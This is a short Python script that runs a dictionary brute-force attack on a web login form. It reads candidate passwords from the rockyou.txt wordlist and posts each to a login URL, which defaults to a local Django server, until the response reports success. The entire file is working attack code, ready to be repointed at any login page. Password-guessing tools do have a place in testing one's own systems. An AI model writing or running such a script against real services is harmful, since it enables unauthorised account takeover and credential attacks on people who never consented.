#!/usr/bin/env python3
import requests

# Change this URL to point to your Django server's login page

url = "http://localhost:8000/login/"

# Path to your dictionary file (each line should contain one password)
password_file = "rockyou.txt"


def brute_force():
    with open(password_file, "r") as f:
        for line in f:
            password = line.strip()
            data = {"password": password}
            try:
                response = requests.post(url, data=data, timeout=5)
                print(f"Trying: {password} => {response.text.strip()}")
                if "Login successful" in response.text:
                    print(f"[+] Password found: {password}")
                    return password
            except Exception as e:
                print(f"Error: {e}")
    print("Password not found in dictionary.")
    return None

if __name__ == "__main__":
    brute_force()

